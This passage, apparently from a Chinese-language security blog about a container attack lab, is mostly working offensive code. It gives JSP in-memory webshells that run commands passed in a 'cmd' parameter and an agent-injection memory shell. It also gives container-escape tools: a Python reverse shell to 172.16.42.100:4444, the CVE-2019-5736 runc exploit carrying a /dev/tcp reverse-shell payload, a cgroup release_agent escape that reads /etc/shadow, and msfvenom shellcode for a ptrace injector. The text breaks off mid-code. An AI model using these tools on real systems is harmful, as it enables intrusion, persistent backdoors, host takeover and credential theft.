Wrapper newWrapper = standardContext.createWrapper();</span><br><span class="line">    String servletName=<span class="string">&quot;ff&quot;</span>;</span><br><span class="line">    newWrapper.setName(servletName);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">    standardContext.addChild(newWrapper);</span><br><span class="line">    <span class="comment">//将Wrapper对象和访问的url绑定</span></span><br><span class="line">    standardContext.addServletMapping(<span class="string">&quot;/servletevil&quot;</span>, servletName);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>利用方式：</p>
<p>访问：</p>
<ul>
<li><p><code>http://172.16.42.10:8081/servletevil.jsp</code></p>
</li>
<li><p><code>http://172.16.42.10:8081/servletevil?cmd=whoami</code> </p>
</li>
</ul>
<p>filter内存马</p>
<ul>
<li>filtermem.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">     <span class="keyword">final</span> String name = <span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">     ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">     Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">     appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">     Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">     stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">     Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">     Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">          Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                    HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                         <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                         Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                         <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">                         servletResponse.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                         process.destroy();</span><br><span class="line">                         <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">          filterDef.setFilter(filter);</span><br><span class="line">          filterDef.setFilterName(name);</span><br><span class="line">          filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">          <span class="comment">/**</span></span><br><span class="line"><span class="comment">           * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">          FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">          filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">          filterMap.setFilterName(name);</span><br><span class="line">          filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">          standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">          Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">          constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">          filterConfigs.put(name,filterConfig);</span><br><span class="line">          out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>先访问：<code>http://172.16.42.10:8081/filtermem.jsp</code></p>
<p>再：<code>http://172.16.42.10:8081/?cmd=id</code></p>
<ul>
<li>filterClassforName.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String name = <span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">        Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    Class rt = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        rt = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.lang.reflect.Method gr = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        gr = rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.lang.reflect.Method ex = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ex = rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    Process process = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmd);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.io.InputStream in = process.getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    PrintWriter out = servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问 <code>http://172.16.42.10:8081/filterClassForName.jsp</code></p>
<p>再<code>http://172.16.42.10:8081/?cmdx=whoami</code></p>
<h3 id="添加agent-java-内存马"><a href="#添加agent-java-内存马" class="headerlink" title="添加agent java 内存马"></a>添加agent java 内存马</h3><p>进入容器，由于注入成功会自动删除jar包，我们对其进行备份</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">cp inject<span class="selector-class">.jar</span> inject<span class="selector-class">.jar</span><span class="selector-class">.bak</span></span><br><span class="line">cp shell-agent<span class="selector-class">.jar</span> shell-agent<span class="selector-class">.jar</span>.bak</span><br></pre></td></tr></table></figure>

<p>注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>edcb337d401a:~# java -jar inject.jar shadowtest</span><br><span class="line"><span class="string">[+]</span> Load Agent Path:/root/shell-agent.jar</span><br><span class="line"><span class="string">[+]</span> OK.i find a jvm:org.apache.catalina.startup.Bootstrap start</span><br><span class="line"><span class="string">[+]</span> memeShell <span class="keyword">is</span> injected.</span><br></pre></td></tr></table></figure>

<p>访问<code>http://172.16.42.10:8081/?psw=shadowtest&amp;cmd=whoami</code> </p>
<h2 id="逃逸相关工具脚本"><a href="#逃逸相关工具脚本" class="headerlink" title="逃逸相关工具脚本"></a>逃逸相关工具脚本</h2><p>参考：<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸</a></p>
<p>procfs逃逸</p>
<ul>
<li>x.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;172.16.42.100&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dv/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<ul>
<li>a.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">gcc <span class="selector-tag">a</span><span class="selector-class">.c</span> -o <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>



<h3 id="CVE-2019-5736-runc容器逃逸漏洞"><a href="#CVE-2019-5736-runc容器逃逸漏洞" class="headerlink" title="CVE-2019-5736 runc容器逃逸漏洞"></a>CVE-2019-5736 runc容器逃逸漏洞</h3><ul>
<li>5736.go</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">//var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="keyword">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="keyword">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="keyword">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">CGO_ENABLED</span>=0 <span class="attribute">GOOS</span>=linux <span class="attribute">GOARCH</span>=amd64 go build 5736.go</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2019-14271-加载不受信任的动态链接"><a href="#CVE-2019-14271-加载不受信任的动态链接" class="headerlink" title="CVE-2019-14271:加载不受信任的动态链接"></a>CVE-2019-14271:加载不受信任的动态链接</h3><p>这个漏洞的脚本暂时不使用，需要宿主机的权限操作。</p>
<h3 id="SYS-ADMIN逃逸"><a href="#SYS-ADMIN逃逸" class="headerlink" title="SYS_ADMIN逃逸"></a>SYS_ADMIN逃逸</h3><ul>
<li>release_agent.sh</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -uex</span><br><span class="line"></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /etc/shadow &gt; <span class="variable">$host_path</span>/output&quot;</span> &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line"> </span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line">cat <span class="string">&quot;/output&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="SYS-PTRACE逃逸"><a href="#SYS-PTRACE逃逸" class="headerlink" title="SYS_PTRACE逃逸"></a>SYS_PTRACE逃逸</h3><p>生成shellcode(如果不生成，会在靶机上生成一个终端)，<font color="red">这里我们需要提前知道反弹shell测试机器的地址和端口</font></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(<font color="red">注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值</font>）:</p>
<ul>
<li>infect.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span 